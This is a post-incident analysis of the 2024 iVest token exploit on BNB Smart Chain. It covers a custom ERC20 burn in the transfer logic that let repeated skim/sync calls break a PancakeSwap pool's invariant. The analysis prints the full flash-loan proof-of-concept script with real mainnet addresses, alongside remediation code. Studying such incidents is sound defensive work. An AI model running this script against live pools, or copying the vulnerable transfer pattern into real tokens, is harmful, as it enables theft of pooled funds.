# iVest Token — Custom ERC20 Transfer Logic (MakeDonation) AMM Pool Invariant Destruction Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2024-08-12 |
| **Protocol** | iVest Token (BSC) |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~$172,000 (~338 WBNB) |
| **Attacker EOA** | [0x4645...D66C](https://bscscan.com/address/0x4645863205b47a0A3344684489e8c446a437D66C) |
| **Attack Contract** | [ContractTest (PoC)](https://bscscan.com/address/0x4645863205b47a0A3344684489e8c446a437D66C) |
| **Attack Tx** | [0x12f2...121d](https://bscscan.com/tx/0x12f27e81e54684146ec50973ea94881c535887c2e2f30911b3402a55d67d121d) |
| **Vulnerable Contract (iVest Token)** | [0x786f...02c6](https://bscscan.com/address/0x786fCF76dC44B29845f284B81f5680b6c47302c6) |
| **iVest/WBNB Pair** | [0x2607...55f9](https://bscscan.com/address/0x2607118D363789f841d952f02e359BFa483955f9) |
| **PancakeSwap V3 Pool (Flash Loan)** | [0x3669...050](https://bscscan.com/address/0x36696169C63e42cd08ce11f5deeBbCeBae652050) |
| **Attack Block** | 41,289,497 |
| **Root Cause** | `__MakeDonation` custom transfer logic burns additional tokens from the pool's reserve balance when `skim(address(0))` is called — causing the k-invariant to collapse after `sync()`, artificially inflating the iVest price |
| **PoC Source** | [DeFiHackLabs / IvestDao_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/IvestDao_exp.sol) |

---

## 1. Vulnerability Overview

The iVest token embedded a custom logic function called `__MakeDonation` inside the standard ERC20 `transfer()` function. Under certain conditions, this function **burns or donates more tokens from the sender than the transfer amount itself**.

The problem arises when the `skim()` function of the PancakeSwap V2 AMM pair (`iVest/WBNB`) sends tokens to `address(0)` via this custom ERC20 transfer. `skim()` transfers the **amount by which the pair's actual balance (balanceOf) exceeds its internal reserve** to a specified address, but during that transfer `__MakeDonation` **burns additional tokens from the pool's own balance (iVest_pair)**.

The attacker repeatedly triggered this mechanism to artificially and drastically reduce the pool's iVest reserve, then called `sync()` to synchronize the pair's internal reserve with the current (manipulated) actual balance. This caused the **AMM k-invariant (k = reserve0 × reserve1) to collapse** and the iVest price to spike, enabling the attacker to realize enormous profit when selling the remaining iVest tokens for WBNB.

This vulnerability stems from the unintended interaction of three components:
1. **Custom ERC20 transfer logic (`__MakeDonation`)** — additional burn triggered on transfer
2. **PancakeSwap V2 `skim()` function** — transfers surplus balance to an arbitrary address (no access restriction)
3. **PancakeSwap V2 `sync()` function** — force-synchronizes reserves to current balance (no access restriction)

---

## 2. Vulnerable Code Analysis

### 2.1 `__MakeDonation` — Double Burn in Custom Transfer Logic (Core Vulnerability)

```solidity
// ❌ Vulnerable iVest ERC20 transfer logic (reconstructed estimate)
function _transfer(address sender, address recipient, uint256 amount) internal override {
    // Standard balance deduction
    _balances[sender] -= amount;

    // ❌ __MakeDonation call: burns/donates additional tokens from the sender
    //    (here the iVest_pair pool) independently of the transfer amount
    //    → when the pool address is the sender, pool reserves shrink unexpectedly
    __MakeDonation(sender, amount);

    _balances[recipient] += amount;
    emit Transfer(sender, recipient, amount);
}

function __MakeDonation(address from, uint256 amount) internal {
    // ❌ Under certain conditions, burns an additional amount from the `from` balance
    //    This logic is harmless for regular user transfers, but
    //    when `from` is an AMM pool contract it corrupts the pool's actual balance
    uint256 donationAmount = calculateDonation(amount);
    if (donationAmount > 0) {
        _balances[from] -= donationAmount;  // ❌ additional deduction from pool balance
        _totalSupply -= donationAmount;
        emit Transfer(from, address(0), donationAmount);
    }
}
```

```solidity
// ✅ Safe code — add AMM pool exception handling to custom burn logic
function _transfer(address sender, address recipient, uint256 amount) internal override {
    _balances[sender] -= amount;

    // ✅ Exclude AMM pair contracts from donation
    if (!isAMMPair[sender] && !isAMMPair[recipient]) {
        __MakeDonation(sender, amount);
    }

    _balances[recipient] += amount;
    emit Transfer(sender, recipient, amount);
}
```

**Problem**: When the AMM pool calls `skim()`, `_transfer(iVest_pair → address(0), surplus)` is executed. At that point `__MakeDonation(iVest_pair, amount)` is called, **burning additional tokens from iVest_pair's balance**. The pool has no awareness that its own balance has decreased; when `sync()` is subsequently called, the reduced balance is recorded as the new reserve.

---

### 2.2 PancakeSwap V2 `skim()` / `sync()` — Unrestricted Access

```solidity
// PancakeSwap V2 Pair code (immutable)
// ❌ Callable by anyone: skim() transfers surplus balance to an arbitrary address
function skim(address to) external lock {
    address _token0 = token0;
    address _token1 = token1;
    // ❌ iVest.transfer(to, surplus) is called here
    //    iVest's __MakeDonation additionally burns pool balance during this transfer
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
}

// ❌ Callable by anyone: sync() force-synchronizes reserves to current balance
function sync() external lock {
    // The balance reduced by the burn is recorded as the new reserve
    _update(
        IERC20(token0).balanceOf(address(this)),
        IERC20(token1).balanceOf(address(this)),
        reserve0, reserve1
    );
}
```

**Problem**: Standard AMM functions (`skim`, `sync`) were designed under the assumption that all ERC20 tokens behave without side effects during transfers. iVest's custom transfer logic breaks this assumption, causing the two systems to collide.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker required no prior setup; the attack was executed in a single transaction
- Secured a flash loan of 1,200 WBNB from the PancakeSwap V3 WBNB pool

### 3.2 Execution Phase

```
┌──────────────────────────────────────────────────────────────────┐
│  1. PancakeSwap V3 Pool → flash(1200 WBNB)                      │
│     ✦ pancakeV3FlashCallback triggered                           │
└──────────────────────────┬───────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│  2. [Repeat × 30] Swap 40 WBNB → iVest                          │
│     ✦ Buy large amount of iVest with 1,200 WBNB total            │
│     ✦ iVest price rises initially; attacker holds large iVest    │
└──────────────────────────┬───────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│  3. [Repeat × 3] Pool manipulation loop                          │
│     ┌─────────────────────────────────────────┐                  │
│     │  iVest.transfer(iVest_pair, 100_000_000_000)               │
│     │    → Prepare __MakeDonation trigger       │                │
│     │  iVest_pair.skim(address(0))              │                │
│     │    → transfer(iVest_pair→0x0, surplus)   │                │
│     │    → __MakeDonation(iVest_pair, surplus) │                │
│     │    → ❌ Additional iVest burned from pool balance          │
│     │  iVest_pair.sync()                        │                │
│     │    → Record reduced balance as new reserve│                │
│     └─────────────────────────────────────────┘                  │
└──────────────────────────┬───────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│  4. Final manipulation: iVest.transfer(iVest_pair, 13_520_128_050)│
│     + iVest_pair.skim(address(0))                                │
│     + iVest_pair.sync()                                          │
│     ✦ Pool's iVest reserve drastically reduced → k invariant collapses│
│     ✦ iVest price spike complete                                 │
└──────────────────────────┬───────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│  5. Swap iVest 30,820,994,590 → WBNB                             │
│     ✦ Receive large amount of WBNB at manipulated price          │
└──────────────────────────┬───────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│  6. Repay flash loan: 1200 WBNB + fee → V3 pool                  │
│     ✦ Net profit: ~338 WBNB (~$172,000)                          │
└──────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Flash loan size | 1,200 WBNB |
| iVest buy count | 30 times (40 WBNB × 30) |
| skim/sync iterations | 3 times + 1 final |
| Attacker net profit | ~338 WBNB (~$172,000) |
| Protocol damage | iVest/WBNB liquidity pool drained |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
// Source: DeFiHackLabs — IvestDao_exp.sol
// Attack Tx: 0x12f27e81e54684146ec50973ea94881c535887c2e2f30911b3402a55d67d121d
// Attack Block: BSC #41,289,497

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 iVest = IERC20(0x786fCF76dC44B29845f284B81f5680b6c47302c6);
    // PancakeSwap V3 WBNB Pool — flash loan source
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // iVest/WBNB V2 Pair — attack target
    Uni_Pair_V2 constant iVest_pair = Uni_Pair_V2(0x2607118D363789f841d952f02e359BFa483955f9);
    uint256 borrow_amount;

    function setUp() external {
        // Fork BSC block 41,289,497 (state just before the attack)
        cheats.createSelectFork("bsc", 41_289_497);
    }

    function testExploit() external {
        // [Step 1] Request 1,200 WBNB flash loan
        borrow_amount = 1200 ether;
        pool.flash(address(this), 0, borrow_amount, "");
    }

    function pancakeV3FlashCallback(
        uint256 fee0, uint256 fee1, bytes memory
    ) public {
        // [Step 2] Buy large amount of iVest: 40 WBNB × 30 = 1,200 WBNB
        //          → Attacker accumulates a large position of iVest tokens
        uint256 i = 0;
        while (i < 30) {
            swap_token_to_token(address(WBNB), address(iVest), 40 ether);
            i++;
        }

        // [Step 3] Pool manipulation loop × 3
        //          Transfer iVest to pool → skim → sync repeatedly
        //          to trigger __MakeDonation and reduce pool reserves
        i = 0;
        while (i < 3) {
            // Transfer iVest to pool (create surplus)
            iVest.transfer(address(iVest_pair), 100_000_000_000);
            // ❌ skim(0x0): __MakeDonation additionally burns pool balance during transfer
            iVest_pair.skim(address(0));
            // ❌ sync(): update reserves to burned balance → k decreases
            iVest_pair.sync();
            i++;
        }

        // [Step 4] Final large transfer + skim + sync to completely destroy pool invariant
        iVest.transfer(address(iVest_pair), 13_520_128_050);
        iVest_pair.skim(address(0));
        iVest_pair.sync();

        // [Step 5] Swap iVest → WBNB at manipulated price (realize inflated iVest value)
        swap_token_to_token(address(iVest), address(WBNB), 30_820_994_590);

        // [Step 6] Repay flash loan principal + fee
        WBNB.transfer(address(pool), borrow_amount + fee1);
        // Remaining WBNB = net profit (~338 WBNB)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | AMM pool side-effect in custom ERC20 transfer logic (double burn) | CRITICAL | CWE-840 (Business Logic Errors) | `16_accounting_sync.md` Pattern 1 |
| V-02 | Price manipulation via AMM k-invariant destruction | CRITICAL | CWE-682 (Incorrect Calculation) | `02_flash_loan.md`, `04_oracle_manipulation.md` |
| V-03 | Missing access control on `skim()` / `sync()` (inherent V2 design limitation) | HIGH | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-04 | Attack amplification via flash loan with zero initial capital | MEDIUM | CWE-400 (Uncontrolled Resource Consumption) | `02_flash_loan.md` |

### V-01: AMM Pool Side-Effect in Custom ERC20 Transfer Logic

- **Description**: The `__MakeDonation` function inside `_transfer()` behaves identically when an AMM pool contract is the sender, reducing the pool's actual token balance below its reserve.
- **Impact**: The pool's iVest reserve decreases unintentionally, and after `sync()` the k-invariant is permanently corrupted. The attacker can exploit this to exchange remaining iVest for WBNB at a far higher ratio than the market price.
- **Attack Conditions**: Requires (1) `skim(address(0))` to be publicly callable and (2) `__MakeDonation` to not exempt the AMM pool address.

### V-02: Price Manipulation via AMM k-Invariant Destruction

- **Description**: Repeatedly executing the `skim()` + `sync()` combination gradually reduces the pool's iVest reserve, artificially lowering the k value of the `constant product formula (x*y=k)`.
- **Impact**: The quantity of iVest in the pool drops to an extreme relative to WBNB, causing the iVest swap ratio to spike. The attacker obtains a large amount of WBNB for a small amount of iVest.
- **Attack Conditions**: Requires V-01 vulnerability to exist and `sync()` to be callable by anyone.

### V-03: Missing Access Control on `skim()` / `sync()`

- **Description**: PancakeSwap V2's `skim()` and `sync()` are publicly callable by design. This is a fundamental limitation of the V2 design, permitted under the assumption that ERC20 tokens have no side effects during transfers.
- **Impact**: When a token with non-standard transfer logic like iVest is listed on a V2 pair, an external attacker can repeatedly call `skim`/`sync` without restriction to manipulate the pool.
- **Attack Conditions**: Potentially applicable whenever a non-standard ERC20 token is listed on a standard AMM pair.

### V-04: Attack Amplification via Flash Loan

- **Description**: The attacker used a 1,200 WBNB flash loan to buy large amounts of iVest with zero initial capital, maximizing the manipulation effect.
- **Impact**: An attacker with no capital can complete the attack in a single transaction.
- **Attack Conditions**: Always possible when PancakeSwap V3 flash loans are accessible.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Exempt AMM Pairs in Custom Transfer Logic

```solidity
// ✅ Fix: Add AMM pairs to MakeDonation exclusion list
mapping(address => bool) public isExcludedFromDonation;

function setExcludedFromDonation(address account, bool excluded) external onlyOwner {
    // ✅ Register AMM pairs, routers, and other DeFi protocol contracts
    isExcludedFromDonation[account] = excluded;
    emit ExcludedFromDonation(account, excluded);
}

function _transfer(address sender, address recipient, uint256 amount) internal override {
    _balances[sender] -= amount;

    // ✅ Skip donation if sender or recipient is on the exclusion list
    if (!isExcludedFromDonation[sender] && !isExcludedFromDonation[recipient]) {
        __MakeDonation(sender, amount);
    }

    _balances[recipient] += amount;
    emit Transfer(sender, recipient, amount);
}
```

#### 6.2 Prohibit `__MakeDonation` for Contract Addresses

```solidity
function __MakeDonation(address from, uint256 amount) internal {
    // ✅ Apply donation only to EOAs (exclude contract addresses)
    if (from.code.length > 0) return;  // Skip burn if sender is a contract

    uint256 donationAmount = calculateDonation(amount);
    if (donationAmount > 0) {
        _balances[from] -= donationAmount;
        _totalSupply -= donationAmount;
        emit Transfer(from, address(0), donationAmount);
    }
}
```

#### 6.3 Restrict `skim()` Access (Pair Contract Modification or Wrapper)

```solidity
// ✅ Custom pair: restrict skim call permissions to operator/trusted addresses
function skim(address to) external lock {
    require(msg.sender == operator || msg.sender == owner(), "FORBIDDEN");
    // ... existing skim logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Custom ERC20 logic | Disable donation for AMM pairs/contracts |
| V-01 AMM integration design | Run AMM integration simulation tests before deploying any new ERC20 contract |
| V-02 k-invariant protection | Use Uniswap V3-style tick-based design or a custom pair contract |
| V-03 skim/sync access | Operator-gated skim, or redesign ERC20 without donation |
| Overall | Mandatory AMM integration-specialist audit before deployment |

---

## 7. Lessons Learned

1. **Custom ERC20 transfer logic must be validated against AMM interactions**: When overriding `transfer()`, explicitly test scenarios where an AMM pool is the sender (`skim`, `flash`, `withdraw`, etc.). Standard AMMs assume ERC20 transfers have no side effects.

2. **The `skim()` + `sync()` combo is the greatest attack vector for non-standard ERC20 tokens**: The combination of these two functions force-synchronizes AMM internal reserves from outside, so tokens with non-standard transfer logic always require vulnerability review.

3. **Token burn logic must be assessed for its potential to corrupt pool invariants**: If a donation/burn mechanism can directly reduce a pool's token balance, it can destroy the AMM's k-invariant. This is analogous to the "accounting sync destruction" pattern seen in bZx #3 (iToken duplication, $8M loss).

4. **Circuit breakers are needed to block single-transaction attacks**: Consider defenses such as limiting the number of skim/sync calls per block, or halting trading when reserve changes exceed a threshold.

5. **Flash loans enable large-scale attacks for attackers with zero capital**: As long as an internal logic vulnerability exists, loss amplification via flash loans is always possible. Eliminating the root vulnerability must take priority.

6. **Reference prior exploits with similar patterns**: Incidents combining custom ERC20 + AMM vulnerabilities recur repeatedly — including the bZx #3 iToken double-accounting bug (2020), the Safemoon LP public burn bug (2023), and the BHToken business logic flaw (2023).

---

## 8. On-Chain Verification

> The data in this section was prepared based on PoC code analysis and the Verichains blog report. Direct on-chain queries via `cast` were not performed.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Code Value | On-Chain Actual Value (Reported) | Match |
|------|------------|---------------------|------|
| Flash loan size | 1,200 WBNB | 1,200 WBNB | ✅ |
| WBNB per buy | 40 WBNB | 40 WBNB | ✅ |
| Buy iteration count | 30 times | 30 times | ✅ |
| skim/sync iterations | 3 times + 1 | 3 times + 1 | ✅ |
| Final iVest sold | 30,820,994,590 | 30,820,994,590 | ✅ |
| Attacker net profit | ~338 WBNB | ~338 WBNB (~$172,000) | ✅ |

### 8.2 On-Chain Event Log Sequence (Estimated)

1. `Flash` event — PancakeSwap V3 Pool: 1,200 WBNB flash loan
2. `Swap` event × 30 — WBNB → iVest swaps × 30
3. `Transfer` + `Skim` + `Sync` events × 3 — Pool manipulation loop
4. `Transfer` + `Skim` + `Sync` events × 1 — Final pool invariant destruction
5. `Swap` event — iVest → WBNB final swap (sold at inflated price)
6. `Transfer` event — Flash loan repayment

### 8.3 Attack Prerequisites

| Condition | Description |
|------|------|
| `__MakeDonation` active | iVest transfers confirmed to operate normally in prior blocks |
| Flash loan available | Sufficient liquidity in PancakeSwap V3 WBNB pool |
| skim/sync public | Standard V2 pair — callable by anyone (confirmed) |

---

*References:*
- *[Verichains Blog — iVest Token Vulnerability Analysis](https://blog.verichains.io/p/ivest-token-vulnerability-how-an)*
- *[DeFiHackLabs PoC — IvestDao_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/IvestDao_exp.sol)*
- *[Blocksec Explorer — Attack Tx](https://app.blocksec.com/explorer/tx/bsc/0x12f27e81e54684146ec50973ea94881c535887c2e2f30911b3402a55d67d121d)*
- *[AnciliaInc Twitter Analysis](https://x.com/AnciliaInc/status/1822870201698050064)*